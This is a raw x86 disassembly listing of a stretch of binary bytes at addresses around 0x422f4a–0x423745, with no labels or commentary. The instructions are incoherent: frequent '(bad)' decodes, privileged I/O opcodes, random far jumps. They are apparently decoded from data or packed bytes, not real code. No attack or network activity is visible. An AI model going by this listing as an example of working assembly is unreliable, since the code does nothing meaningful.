  422f4a:	jmp    0xf406:0xb61445b7
  422f51:	or     al,0x23
  422f53:	cli    
  422f54:	cmp    BYTE PTR [edi+0x68b4f911],dh
  422f5a:	sub    al,0xc
  422f5c:	stos   DWORD PTR es:[edi],eax
  422f5d:	ins    DWORD PTR es:[edi],dx
  422f5e:	sbb    BYTE PTR [esi+0x9edb11d],ch
  422f64:	div    DWORD PTR ds:0x94ee3b20
  422f6a:	mov    ds:0xca6f1f4d,eax
  422f6f:	push   ebp
  422f70:	mov    edi,0x16878d09
  422f75:	jp     0x422f69
  422f77:	sub    BYTE PTR [edx+eax*1-0x6b1e7d59],cl
  422f7e:	loop   0x422f6c
  422f80:	jae    0x422f44
  422f82:	dec    edi
  422f83:	ins    DWORD PTR es:[edi],dx
  422f84:	cmp    bh,bl
  422f86:	aaa    
  422f87:	xchg   esp,eax
  422f88:	sub    esi,DWORD PTR ds:0x30bc0892
  422f8e:	pop    ss
  422f8f:	adc    al,BYTE PTR [edx-0x63efc2c7]
  422f95:	stos   DWORD PTR es:[edi],eax
  422f96:	mov    BYTE PTR [ecx],bh
  422f98:	xor    ch,BYTE PTR [ebx]
  422f9a:	xchg   ebx,eax
  422f9b:	jae    0x422ff0
  422f9d:	xchg   ebx,eax
  422f9e:	fcmovnu st,st(1)
  422fa0:	mov    ebp,?
  422fa2:	mov    dh,0x1d
  422fa4:	sbb    al,0x47
  422fa6:	leave  
  422fa7:	jb     0x422fe4
  422fa9:	stc    
  422faa:	retf   
  422fab:	int    0x5c
  422fad:	gs jg  0x422f94
  422fb0:	call   FWORD PTR [esp+esi*4-0x54]
  422fb4:	icebp  
  422fb5:	mov    ds:0xa5eaf499,eax
  422fba:	out    0x17,eax
  422fbc:	mov    al,ds:0x31f74a44
  422fc1:	dec    esp
  422fc2:	jle    0x422f8e
  422fc4:	jo     0x422fac
  422fc6:	out    0x64,al
  422fc8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422fc9:	or     ch,dh
  422fcb:	dec    ebx
  422fcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422fcd:	pop    edi
  422fce:	(bad)  
  422fcf:	aad    0xfb
  422fd1:	or     BYTE PTR [edi+edi*1+0x4c],ah
  422fd5:	aas    
  422fd6:	sti    
  422fd7:	add    BYTE PTR fs:[ecx],bh
  422fda:	sub    cl,BYTE PTR [ecx+0x59]
  422fdd:	(bad)  
  422fde:	xchg   edx,eax
  422fdf:	(bad)  
  422fe0:	mov    eax,0x5a1ce5e5
  422fe5:	cmc    
  422fe6:	es mov ebx,0xa4281af1
  422fec:	mov    ecx,0x3f5346f0
  422ff1:	jecxz  0x423025
  422ff3:	sbb    ebx,ebx
  422ff5:	dec    edi
  422ff6:	inc    edi
  422ff7:	and    BYTE PTR [eax-0x55f19a12],cl
  422ffd:	test   al,0x6d
  422fff:	cmp    ch,BYTE PTR [ebp+0x20]
  423002:	mov    eax,0xf4e51100
  423007:	mov    ecx,0xa61b56cc
  42300c:	mov    ebp,0xf36af570
  423011:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423012:	outs   dx,DWORD PTR ds:[esi]
  423013:	pop    ebx
  423014:	fs pushf 
  423016:	call   0x67a:0x6ab61a95
  42301d:	out    0x76,al
  42301f:	jmp    0x5e16:0x7b206aeb
  423026:	jl     0x42303e
  423028:	clc    
  423029:	dec    ebx
  42302a:	pop    edi
  42302b:	cli    
  42302c:	iret   
  42302d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42302e:	repnz pop edx
  423030:	add    ebp,DWORD PTR [edi-0x5]
  423033:	dec    edi
  423034:	adc    BYTE PTR [eax+ebx*4+0x12f34eac],dl
  42303b:	push   es
  42303c:	sub    eax,0x793d3a3
  423041:	fsubr  QWORD PTR [ebp-0x23e2d10e]
  423047:	je     0x422fe0
  423049:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42304a:	sbb    al,bl
  42304c:	(bad)  
  42304d:	adc    al,0x68
  42304f:	outs   dx,BYTE PTR ds:[esi]
  423050:	aas    
  423051:	ror    DWORD PTR [ebp-0x51],1
  423054:	add    eax,0x669f4f3
  423059:	sub    eax,DWORD PTR [esi-0x403e73ae]
  42305f:	cmp    DWORD PTR [ecx],esi
  423061:	je     0x4230ab
  423063:	push   ebx
  423064:	pop    eax
  423065:	inc    esi
  423066:	mov    edi,0x3893298a
  42306b:	dec    ebp
  42306c:	popf   
  42306d:	jne    0x42306f
	...
  423077:	add    BYTE PTR [eax],al
  423079:	add    dl,dh
  42307b:	rol    BYTE PTR ds:0xf6d53751,0xe3
  423082:	test   BYTE PTR [eax],0xec
  423085:	inc    esi
  423086:	je     0x423043
  423088:	sub    al,0xba
  42308a:	mov    eax,0xfc0001aa
  42308f:	add    DWORD PTR [eax],eax
  423091:	add    cl,dh
  423093:	jb     0x423069
  423095:	and    DWORD PTR [edi],0xffffffd3
  423098:	mov    ebx,0x4ac795ff
  42309d:	xchg   edx,eax
  42309e:	sub    eax,0x7c52f8ee
  4230a3:	repz jg 0x42306d
  4230a6:	or     BYTE PTR [ecx+0x16c98b3a],bl
  4230ac:	leave  
  4230ad:	jp     0x4230e1
  4230af:	imul   edx,DWORD PTR [edx+0x6e],0xffffffcb
  4230b3:	dec    ebp
  4230b4:	add    al,0x79
  4230b6:	je     0x423051
  4230b8:	xor    eax,0x10c8b3a5
  4230bd:	loope  0x42313b
  4230bf:	push   es
  4230c0:	push   esp
  4230c1:	mov    DWORD PTR [esi],edx
  4230c3:	push   ecx
  4230c4:	push   ss
  4230c5:	(bad)  
  4230c7:	hlt    
  4230c8:	sbb    eax,0x390b5598
  4230cd:	jb     0x423090
  4230cf:	push   ss
  4230d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230d1:	add    al,0x65
  4230d3:	sub    DWORD PTR [edi+0x38c47401],ebp
  4230d9:	xlat   BYTE PTR ds:[ebx]
  4230da:	push   edx
  4230db:	pusha  
  4230dc:	sbb    al,0xe
  4230df:	push   eax
  4230e0:	xchg   edi,eax
  4230e1:	sub    ecx,esi
  4230e3:	clc    
  4230e4:	xchg   esi,eax
  4230e5:	adc    bl,dh
  4230e7:	lea    esp,[edi-0x470c6ba3]
  4230ed:	jnp    0x4230b6
  4230ef:	in     al,dx
  4230f0:	mov    cl,0xd8
  4230f2:	outs   dx,BYTE PTR ds:[esi]
  4230f3:	in     al,0x40
  4230f5:	leave  
  4230f6:	shr    esi,cl
  4230f8:	lahf   
  4230f9:	scas   eax,DWORD PTR es:[edi]
  4230fa:	dec    eax
  4230fb:	and    DWORD PTR [edi+0x15fe181e],esp
  423101:	icebp  
  423102:	xor    DWORD PTR [edi],eax
  423104:	popf   
  423105:	sbb    eax,0xbe331826
  42310a:	repnz scas al,BYTE PTR es:[edi]
  42310c:	imul   ebp,esi,0xa030496a
  423112:	push   0x56
  423114:	add    bl,BYTE PTR [ebp-0x46]
  423117:	jmp    0x423181
  423119:	mov    esi,DWORD PTR [edx-0x9]
  42311c:	adc    dl,bh
  42311e:	jno    0x4230aa
  423120:	lds    ecx,FWORD PTR [esi-0x614c3fcc]
  423126:	lea    esi,[ecx-0x2677abfc]
  42312c:	jg     0x423143
  42312e:	fidivr WORD PTR [ecx-0x5fbb6047]
  423134:	cld    
  423135:	push   esp
  423136:	pop    edi
  423137:	jbe    0x423152
  423139:	fadd   QWORD PTR [esi-0x19]
  42313c:	fwait
  42313d:	in     al,0x12
  42313f:	mov    bl,0x57
  423141:	fs cs pop ds
  423144:	sbb    eax,0x21c7e6ff
  423149:	dec    edi
  42314a:	mov    ebx,esp
  42314c:	in     eax,dx
  42314d:	add    ah,ah
  42314f:	or     al,0x5e
  423151:	(bad)  
  423152:	cmp    eax,0x32518da6
  423157:	add    BYTE PTR [esi],0xf6
  42315a:	push   esi
  42315b:	push   ecx
  42315c:	add    dl,BYTE PTR [ebp+0x4f]
  42315f:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  423161:	popf   
  423162:	adc    BYTE PTR [esi+ecx*8],cl
  423165:	fist   WORD PTR [esi-0x586c9859]
  42316b:	push   ebp
  42316c:	cmp    DWORD PTR [edx+0x5],ebx
  42316f:	inc    edi
  423170:	adc    BYTE PTR [ecx-0x42aea702],dh
  423176:	rcl    BYTE PTR [edx],cl
  423178:	jmp    0x333ed867
  42317d:	aad    0x39
  42317f:	jnp    0x423153
  423181:	in     eax,0x38
  423183:	repz add DWORD PTR [ebx+0x7908b5e7],esp
  42318a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42318b:	sbb    ecx,DWORD PTR [ebp+0x3b]
  42318e:	jg     0x42313c
  423190:	clc    
  423191:	and    ecx,DWORD PTR [edi+0x7f0a18df]
  423197:	xor    DWORD PTR [eax+ecx*8],0x29
  42319b:	xchg   esi,ebx
  42319d:	dec    edi
  42319e:	cmp    edx,DWORD PTR [ebp-0x73343579]
  4231a4:	daa    
  4231a5:	sti    
  4231a6:	mov    eax,0xa33b7d7
  4231ab:	push   0xffffffb0
  4231ad:	or     BYTE PTR [eax-0xe],bh
  4231b0:	and    edi,eax
  4231b2:	mov    edi,DWORD PTR [edi+eax*4-0x142fd558]
  4231b9:	iret   
  4231ba:	dec    esi
  4231bb:	mov    ch,0xee
  4231bd:	mov    ah,0x92
  4231bf:	fild   QWORD PTR [ecx]
  4231c1:	iret   
  4231c2:	das    
  4231c3:	in     eax,0xd
  4231c5:	sub    eax,0x335d461e
  4231ca:	pop    ebx
  4231cb:	adc    edx,edx
  4231cd:	xchg   ch,dl
  4231cf:	ds loope 0x4231f4
  4231d2:	test   dl,0x96
  4231d5:	fwait
  4231d6:	pop    edx
  4231d7:	sub    DWORD PTR [ebx+edx*2],ecx
  4231da:	jle    0x423259
  4231dc:	cmc    
  4231dd:	pop    ss
  4231de:	arpl   ax,bp
  4231e0:	call   0xd217b740
  4231e5:	jae    0x42320b
  4231e7:	inc    ebx
  4231e8:	out    0x72,al
  4231ea:	icebp  
  4231eb:	xor    al,0xf
  4231ed:	fwait
  4231ee:	ins    DWORD PTR es:[edi],dx
  4231ef:	adc    al,0x5
  4231f1:	rol    BYTE PTR [esi+0x42],1
  4231f4:	jae    0x42320a
  4231f6:	adc    al,0xdf
  4231f8:	icebp  
  4231f9:	cwde   
  4231fa:	dec    esi
  4231fb:	loop   0x4231a3
  4231fd:	or     bl,cl
  4231ff:	jmp    0x423211
  423201:	push   cs
  423202:	mov    edi,0x6d01c1f0
  423207:	jg     0x423259
  423209:	jmp    0x423254
  42320b:	mov    ecx,0x218cb164
  423210:	into   
  423211:	dec    DWORD PTR [ecx-0x7d]
  423214:	jle    0x42319c
  423216:	retf   0xb835
  423219:	mov    cl,0x99
  42321b:	retf   
  42321c:	pusha  
  42321d:	pop    eax
  42321e:	add    al,0x13
  423220:	mov    BYTE PTR [esp+edx*2],al
  423223:	repnz sub eax,0xf39bd281
  423229:	mov    ebp,DWORD PTR [esp+ecx*8+0x54]
  42322d:	scas   eax,DWORD PTR es:[edi]
  42322e:	mov    bh,0x7
  423230:	xchg   ebp,eax
  423231:	test   DWORD PTR [edx],ebx
  423233:	out    dx,al
  423234:	cmp    ecx,esi
  423236:	mov    esp,0xe531be65
  42323b:	adc    al,0x18
  42323d:	dec    ebx
  42323e:	fsub   DWORD PTR [edi+0x3e9e25e2]
  423244:	xor    al,0xe6
  423246:	cmovl  edi,DWORD PTR [edi+0x1628e7d9]
  42324d:	cmp    DWORD PTR [eax],edx
  42324f:	fst    DWORD PTR [edi+0x79]
  423252:	dec    esp
  423253:	shl    DWORD PTR [edx-0x46dc7e0a],cl
  423259:	int3   
  42325a:	test   ebp,eax
  42325c:	adc    al,0x13
  42325e:	pop    edi
  42325f:	aad    0x32
  423261:	ficomp WORD PTR [esi+eax*8]
  423264:	adc    al,0x89
  423266:	dec    ebp
  423267:	inc    ebx
  423268:	fiadd  WORD PTR [edi]
  42326a:	inc    eax
  42326b:	sti    
  42326c:	push   esi
  42326d:	test   al,0x4a
  42326f:	nop
  423270:	pushf  
  423271:	int    0x53
  423273:	jb     0x423231
  423275:	scas   eax,DWORD PTR es:[edi]
  423276:	dec    ebx
  423277:	and    al,0xe4
  423279:	xchg   ebx,eax
  42327a:	mov    ecx,0xf19f3bdd
  42327f:	xchg   ebx,eax
  423280:	pop    ebp
  423281:	push   0x85e39b3a
  423286:	iret   
  423287:	ret    
  423288:	int    0xff
  42328a:	ffreep st(5)
  42328c:	fadd   st,st(6)
	...
  42329a:	inc    ebx
  42329b:	inc    ecx
  42329c:	popa   
  42329d:	data16 arpl WORD PTR [esi+0x47],sp
  4232a1:	gs push cs
  4232a3:	mov    BYTE PTR [edi-0x37],bh
  4232a6:	adc    al,dl
  4232a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232a9:	jb     0x42325f
  4232ab:	lods   al,BYTE PTR ds:[esi]
  4232ac:	add    DWORD PTR [eax],eax
  4232ae:	cld    
  4232af:	add    DWORD PTR [eax],eax
  4232b1:	add    dl,ah
  4232b3:	jo     0x423310
  4232b5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4232b6:	dec    ebp
  4232b7:	mov    eax,0x9d29095f
  4232bc:	nop
  4232bd:	ror    BYTE PTR [eiz*8-0x4a966987],1
  4232c4:	jnp    0x4232b9
  4232c6:	fcom   st(7)
  4232c8:	sbb    edx,DWORD PTR [edx-0x6def9f7e]
  4232ce:	shl    BYTE PTR [ebx+0x6f7b1ee],cl
  4232d4:	repnz sahf 
  4232d6:	rcl    DWORD PTR [ebx+0xb82c379],0x94
  4232dd:	xchg   ebx,eax
  4232de:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4232df:	sbb    DWORD PTR [esi+edi*8-0x4c79162e],esp
  4232e6:	pop    esi
  4232e7:	aas    
  4232e8:	adc    eax,0x7366c579
  4232ed:	fst    DWORD PTR [edx+eiz*4]
  4232f0:	jp     0x42335a
  4232f2:	or     al,0x54
  4232f4:	sub    al,0x56
  4232f6:	mov    edx,DWORD PTR [edi-0x53]
  4232f9:	dec    ecx
  4232fa:	data16 hlt 
  4232fc:	jb     0x42331d
  4232fe:	mov    ds:0x8113aa56,eax
  423303:	retf   0xef2f
  423306:	pop    ebx
  423307:	loop   0x4232d3
  423309:	hlt    
  42330a:	ja     0x423352
  42330c:	xchg   DWORD PTR [edx],esp
  42330e:	mov    ds:0x48dcd14e,eax
  423313:	xor    BYTE PTR [esi],0x78
  423316:	cmp    esp,DWORD PTR [eax+0x6]
  423319:	rol    BYTE PTR [edx],cl
  42331b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42331c:	std    
  42331d:	add    eax,0x30f11ec6
  423322:	push   es
  423323:	xchg   esi,eax
  423324:	sub    al,0x43
  423326:	jp     0x423345
  423328:	mov    al,ds:0x3677fad6
  42332d:	or     dl,al
  42332f:	cmp    DWORD PTR [edx+esi*2-0x9dfd62e],0x1
  423337:	inc    esp
  423338:	jmp    0xe62e:0x18fd0069
  42333f:	xchg   cl,dh
  423341:	jle    0x423301
  423343:	cmp    DWORD PTR [edx-0x10b40f19],0x25
  42334a:	adc    eax,0x399ed897
  423350:	xchg   edi,eax
  423351:	aam    0xe9
  423353:	jb     0x42337f
  423355:	outs   dx,BYTE PTR ds:[esi]
  423356:	addr16 ret 0xd53a
  42335a:	gs xchg al,bh
  42335d:	popf   
  42335e:	xchg   ecx,eax
  42335f:	in     al,dx
  423360:	std    
  423361:	out    0xf9,al
  423363:	nop
  423364:	pop    ebp
  423365:	fnsave [edx-0x6e957987]
  42336b:	icebp  
  42336c:	dec    eax
  42336d:	adc    ebp,DWORD PTR [ebx-0x6cab6772]
  423373:	maxps  xmm4,xmm5
  423376:	xchg   ebp,eax
  423377:	jns    0x42334d
  423379:	frstor [edx+0x3b43d6e5]
  42337f:	leave  
  423380:	gs cdq 
  423382:	fwait
  423383:	xchg   esp,eax
  423384:	nop
  423385:	push   es
  423386:	paddw  mm0,QWORD PTR [ebx+0x4b]
  42338a:	test   DWORD PTR [eax+0x3a],esp
  42338d:	push   ebp
  42338e:	scas   eax,DWORD PTR es:[edi]
  42338f:	jl     0x423375
  423391:	addr16 inc edi
  423393:	adc    eax,0x991e1802
  423398:	mov    eax,ds:0x1aab3adf
  42339d:	jns    0x423414
  42339f:	push   ebp
  4233a0:	mov    bh,0xf8
  4233a2:	add    ebx,edx
  4233a4:	ins    DWORD PTR es:[edi],dx
  4233a5:	and    BYTE PTR [ebx-0x54],0xca
  4233a9:	hlt    
  4233aa:	pop    edx
  4233ab:	in     al,0x74
  4233ad:	xor    BYTE PTR [ebx-0x676858ff],0x9d
  4233b4:	add    esp,DWORD PTR [eax+0x13215c13]
  4233ba:	jl     0x4233fd
  4233bc:	inc    edx
  4233bd:	(bad)  
  4233be:	jmp    0x4233c4
  4233c0:	mov    ss,WORD PTR [eax]
  4233c2:	(bad)  
  4233c5:	dec    eax
  4233c6:	loope  0x4233c9
  4233c8:	outs   dx,DWORD PTR ds:[esi]
  4233c9:	sbb    al,0x51
  4233cb:	(bad)  
  4233cd:	repnz mov bl,0xed
  4233d0:	in     eax,dx
  4233d1:	push   ds
  4233d2:	dec    esi
  4233d3:	out    0x6f,eax
  4233d5:	test   esi,eax
  4233d7:	inc    esi
  4233d8:	aas    
  4233d9:	out    0x9d,al
  4233db:	imul   ebx,ebx,0xffffff91
  4233de:	cld    
  4233df:	adc    esi,ebx
  4233e1:	aas    
  4233e2:	loope  0x423426
  4233e4:	push   esp
  4233e5:	outs   dx,BYTE PTR ds:[esi]
  4233e6:	lahf   
  4233e7:	mov    esi,0xfc4a8631
  4233ec:	ins    BYTE PTR es:[edi],dx
  4233ed:	cmp    DWORD PTR [edx+0x1d],0x4e
  4233f1:	or     dl,BYTE PTR ds:0x11bcf415
  4233f7:	out    dx,al
  4233f8:	call   0xc8035221
  4233fd:	fbld   TBYTE PTR [ecx]
  4233ff:	jne    0x4233da
  423401:	mov    esi,0x63a30898
  423406:	sti    
  423407:	(bad)  
  423408:	mov    eax,ds:0x4d33dbae
  42340d:	sahf   
  42340e:	jb     0x42340f
  423410:	das    
  423411:	test   al,0xc
  423413:	adc    BYTE PTR [esi+0x3960ec70],0x57
  42341a:	jecxz  0x4233c4
  42341c:	pop    esp
  42341d:	mov    ch,0xf9
  42341f:	jmp    0x4233ee
  423421:	loop   0x4233d3
  423423:	xor    edx,0x8
  423426:	sbb    ah,cl
  423428:	push   ebx
  423429:	xchg   edx,eax
  42342a:	adc    dh,BYTE PTR [esi-0x70be2c31]
  423430:	add    al,BYTE PTR [eax-0x42b80c09]
  423436:	xor    dh,cl
  423438:	stos   DWORD PTR es:[edi],eax
  423439:	adc    ebx,DWORD PTR [eax]
  42343b:	mov    DWORD PTR [eax],ebp
  42343d:	sbb    al,0xe9
  42343f:	cdq    
  423440:	xor    eax,0x1a69df39
  423445:	pop    esi
  423446:	retf   
  423447:	nop
  423448:	inc    esp
  423449:	inc    ecx
  42344a:	mov    ebp,0x95d11dd7
  42344f:	cmp    dl,BYTE PTR gs:[ebx]
  423452:	sub    DWORD PTR [ebx+0x4e],0x858fd91f
  423459:	push   ecx
  42345a:	pop    ss
  42345b:	retf   0xcfc2
  42345e:	push   cs
  42345f:	push   esi
  423460:	adc    al,0x86
  423462:	(bad)  
  423463:	jp     0x423462
  423465:	sub    al,0x8d
  423467:	ds adc dh,dl
  42346a:	push   edi
  42346b:	rol    BYTE PTR [ebx-0x39],cl
  42346e:	xchg   esi,eax
  42346f:	jg     0x4234b7
  423471:	dec    edx
  423472:	dec    ebx
  423473:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423474:	adc    al,0x9d
  423476:	cmp    bh,dl
  423478:	xor    DWORD PTR [esp+ebx*8+0x12575f63],0xffffffd5
  423480:	mov    ch,0x1
  423482:	lock aam 0x23
  423485:	lods   eax,DWORD PTR ds:[esi]
  423486:	xchg   esp,eax
  423487:	mov    WORD PTR [ebx+0x7b7e8452],gs
  42348d:	in     eax,0x3a
  42348f:	and    dh,BYTE PTR [esi-0x26]
  423492:	pop    esi
  423493:	out    dx,eax
  423494:	cmp    DWORD PTR [edx],edi
  423496:	imul   esi,DWORD PTR [ebp-0x2dd49f81],0x53
  42349d:	sbb    eax,0x34c85dec
  4234a2:	addr16 mov bh,dl
  4234a5:	aad    0x0
  4234a7:	push   es
  4234a8:	jns    0x4234c0
  4234aa:	sbb    eax,0x4c975
	...
  4234b7:	add    BYTE PTR [eax],al
  4234b9:	add    BYTE PTR [ebx-0xce42c16],cl
  4234bf:	cmp    ecx,ebx
  4234c1:	cli    
  4234c2:	cmp    dh,bl
  4234c4:	adc    BYTE PTR [ebx],dl
  4234c6:	xor    esp,DWORD PTR [ebp-0x80]
  4234c9:	pop    ecx
  4234ca:	mov    al,0xae
  4234cc:	add    DWORD PTR [eax],eax
  4234ce:	cld    
  4234cf:	add    DWORD PTR [eax],eax
  4234d1:	add    BYTE PTR [esi+0x1448fc1a],ch
  4234d7:	add    eax,0x7d55c50e
  4234dc:	popf   
  4234dd:	cmc    
  4234de:	call   0x2300e505
  4234e3:	je     0x423496
  4234e5:	xor    BYTE PTR [ebp+0x57674129],dl
  4234eb:	leave  
  4234ec:	js     0x4234ee
  4234ee:	je     0x4234fe
  4234f0:	cli    
  4234f1:	imul   ecx,DWORD PTR [esi+0x6d13a2c0],0x5105baa0
  4234fb:	mov    dh,0xb6
  4234fd:	adc    BYTE PTR [ebp+0xbb4e91],cl
  423503:	ins    DWORD PTR es:[edi],dx
  423504:	mov    cl,0xdd
  423506:	jge    0x4234fb
  423508:	lods   eax,DWORD PTR ds:[esi]
  423509:	jae    0x4234f8
  42350b:	mov    ecx,0xb2869733
  423510:	addr16 retf 0x15dd
  423514:	jb     0x423512
  423516:	sub    DWORD PTR [ebp-0x16495538],esp
  42351c:	imul   ebp,DWORD PTR [edi-0x59],0x53553c3d
  423523:	mov    ?,WORD PTR [ebp-0x675b65cd]
  423529:	xlat   BYTE PTR ds:[ebx]
  42352a:	fisub  WORD PTR [ecx+0x3f]
  42352e:	retf   0xe8b9
  423531:	mov    ebp,ebp
  423533:	ja     0x42351b
  423535:	pop    es
  423536:	mov    dl,0x5f
  423538:	sbb    eax,0x9b2f92de
  42353d:	fdivr  DWORD PTR [ebx+0x20]
  423540:	mov    WORD PTR [eax-0x3],ds
  423543:	outs   dx,BYTE PTR ds:[esi]
  423544:	les    ecx,FWORD PTR [eax-0x36bdc915]
  42354a:	cmp    dh,cl
  42354c:	and    eax,0xd8ad8638
  423551:	or     bh,ch
  423553:	mov    eax,ds:0x5cab791d
  423558:	sub    edx,DWORD PTR [esi]
  42355a:	mov    cl,0x3e
  42355c:	push   0xffffffd8
  42355e:	adc    al,0x12
  423560:	and    eax,0x4008d661
  423565:	sub    eax,0x9bea9719
  42356a:	das    
  42356b:	and    BYTE PTR [edx+edi*8-0x76e55c57],ch
  423572:	retf   
  423573:	lock scas eax,DWORD PTR es:[edi]
  423575:	sbb    eax,0x78fb478d
  42357a:	pop    ebx
  42357b:	jmp    0x42354e
  42357d:	xor    edi,eax
  42357f:	neg    DWORD PTR [esi-0x30]
  423582:	lock pusha 
  423584:	jmp    0x423539
  423586:	sbb    eax,0xb013e6fe
  42358b:	cdq    
  42358c:	push   ecx
  42358d:	and    eax,esi
  42358f:	mov    ds:0x40bd1063,al
  423594:	das    
  423595:	out    0x26,eax
  423597:	clc    
  423598:	xor    DWORD PTR [esi+0x60],ebp
  42359b:	ins    BYTE PTR es:[edi],dx
  42359c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42359d:	jl     0x4235b7
  42359f:	jmp    0x11eeec6c
  4235a4:	adc    bl,0xc7
  4235a7:	into   
  4235a8:	jmp    0x8d02:0xa665232f
  4235af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4235b0:	dec    ebx
  4235b1:	add    cl,ah
  4235b3:	addr16 adc al,0x10
  4235b6:	scas   eax,DWORD PTR es:[edi]
  4235b7:	mov    dh,0xde
  4235b9:	setb   BYTE PTR [eax+0x4]
  4235bd:	stos   DWORD PTR es:[edi],eax
  4235be:	imul   ebx,DWORD PTR ds:0xa213aee2,0x4c60bb4
  4235c8:	dec    edx
  4235c9:	repnz fwait
  4235cb:	xor    al,0xa
  4235cd:	loopne 0x423565
  4235cf:	loop   0x42359b
  4235d1:	cli    
  4235d2:	(bad)  
  4235d3:	jge    0x42362f
  4235d5:	adc    BYTE PTR [edx],0xee
  4235d8:	push   ds
  4235d9:	mov    edi,esi
  4235db:	into   
  4235dc:	stc    
  4235dd:	mov    edi,0x5f9aef61
  4235e2:	addr16 cmp eax,ebx
  4235e5:	test   al,0xbf
  4235e7:	mov    fs,WORD PTR [edi-0x48cb8249]
  4235ed:	mov    al,ds:0x7ddedd99
  4235f2:	and    eax,0x5a5ec69d
  4235f7:	scas   al,BYTE PTR es:[edi]
  4235f8:	add    ch,cl
  4235fa:	out    0x5e,eax
  4235fc:	in     eax,0x56
  4235fe:	sbb    al,0xd7
  423600:	je     0x4235b4
  423602:	dec    esp
  423603:	fsubr  QWORD PTR [ebx]
  423605:	sub    ch,BYTE PTR [eax]
  423607:	hlt    
  423608:	loopne 0x423678
  42360a:	mov    esp,0x98ca5bb1
  42360f:	jmp    0x42368e
  423611:	mov    bl,ah
  423613:	in     al,0xf5
  423615:	pop    ebx
  423616:	jo     0x4235f2
  423618:	pusha  
  423619:	sub    esi,ebx
  42361b:	loope  0x4235bb
  42361d:	adc    eax,0xdda1d3b6
  423622:	addr16 sbb eax,0xca280d61
  423628:	xor    eax,0x1b6c126c
  42362d:	mov    edi,0x3c3175d0
  423632:	and    DWORD PTR [edi-0x500636a],ebp
  423638:	int    0xa2
  42363a:	inc    edx
  42363b:	es pusha 
  42363d:	jmp    0x42367d
  42363f:	xchg   ebx,eax
  423640:	jns    0x4235f7
  423642:	add    al,0xa
  423644:	mov    ch,al
  423646:	pop    esp
  423647:	sti    
  423648:	pop    ds
  423649:	push   0x26
  42364b:	(bad)  
  42364c:	adc    al,0x6a
  42364e:	stc    
  42364f:	mov    eax,0x5d7e7112
  423654:	xor    ebp,edi
  423656:	cwde   
  423657:	rol    DWORD PTR [edi-0x78],cl
  42365a:	xchg   dh,ch
  42365c:	inc    esi
  42365d:	popf   
  42365e:	je     0x423625
  423660:	mov    esp,DWORD PTR [eax]
  423662:	repz ficom WORD PTR [ebp+0x31811dfb]
  423669:	outs   dx,DWORD PTR ds:[esi]
  42366a:	dec    eax
  42366b:	add    dl,BYTE PTR [ebp-0x2bc2879b]
  423671:	mov    WORD PTR [ebx-0x2e],?
  423674:	push   ebx
  423675:	sar    bh,1
  423677:	xor    al,0xf0
  423679:	push   ss
  42367a:	mov    ah,BYTE PTR [ecx+0x725a50fe]
  423680:	sti    
  423681:	test   BYTE PTR [ebp-0x63],dh
  423684:	xor    BYTE PTR [esi],bh
  423686:	adc    eax,0xb9ece39
  42368b:	clc    
  42368c:	add    BYTE PTR [eax],ch
  42368e:	aam    0x3
  423690:	out    0xe2,eax
  423692:	mov    cl,BYTE PTR [eax-0x522afb36]
  423698:	sar    ebx,cl
  42369a:	and    DWORD PTR [esi],0xff3a083c
  4236a0:	cmp    al,0xd9
  4236a2:	sbb    al,BYTE PTR ds:0xdbf4cc7e
  4236a8:	sub    DWORD PTR [edi-0x34],esp
  4236ab:	lock cmp al,cl
  4236ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4236af:	fist   WORD PTR [eax-0x43]
  4236b2:	stos   BYTE PTR es:[edi],al
  4236b3:	imul   esp,DWORD PTR [edx+0x38],0xffffffa0
  4236b7:	arpl   WORD PTR [ebp-0x24287260],cx
  4236bd:	lea    ebx,[edi]
  4236bf:	sbb    eax,0xab617ba9
  4236c4:	and    al,0x31
  4236c6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4236c7:	aaa    
  4236c8:	xlat   BYTE PTR ds:[ebx]
  4236c9:	push   0xe24f7c23
	...
  4236da:	shl    BYTE PTR [edx],cl
  4236dc:	xchg   esi,eax
  4236dd:	call   0xe61:0x6adebef6
  4236e4:	cmp    DWORD PTR [eax],esi
  4236e6:	fmul   DWORD PTR [eax+eiz*2+0x32]
  4236ea:	lods   al,BYTE PTR ds:[esi]
  4236eb:	mov    al,0x1
  4236ed:	add    ah,bh
  4236ef:	add    DWORD PTR [eax],eax
  4236f1:	add    BYTE PTR [ebx+eiz*4-0x316e9ec6],dl
  4236f8:	fdiv   DWORD PTR [eax]
  4236fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4236fb:	(bad)  
  4236fc:	mov    bl,0xf7
  4236fe:	pop    esi
  4236ff:	mov    ebx,0x907cf2eb
  423704:	ins    DWORD PTR es:[edi],dx
  423705:	(bad)  
  423706:	adc    BYTE PTR [esi+0x601e1eea],0x99
  42370d:	ja     0x4236a1
  42370f:	push   ecx
  423710:	xchg   edx,eax
  423711:	loope  0x423705
  423713:	mov    ebp,0x4c049726
  423718:	jmp    0x90a30af4
  42371d:	pop    ss
  42371e:	and    DWORD PTR [edx],eax
  423720:	mov    ebp,0xd667ae4f
  423725:	sbb    eax,0xd649d3f3
  42372a:	les    esp,FWORD PTR [eax]
  42372c:	mov    esi,0x5ce4788b
  423731:	in     eax,0xc0
  423733:	pop    ebx
  423734:	xchg   esp,eax
  423735:	mov    esp,0x74740e13
  42373a:	sti    
  42373b:	or     bl,BYTE PTR [edx+0x1b]
  42373e:	mov    ch,0x4c
  423740:	hlt    
  423741:	mov    bh,0x76
  423743:	imul   esi
  423745:	lea    esp,[ecx+ebx*4]
